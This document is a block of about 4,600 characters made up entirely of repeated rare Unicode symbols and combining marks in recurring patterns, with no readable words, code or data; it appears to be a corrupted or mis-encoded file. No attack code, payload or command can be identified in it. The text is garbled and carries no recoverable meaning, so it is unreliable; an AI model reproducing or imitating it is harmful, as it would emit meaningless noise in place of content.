࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛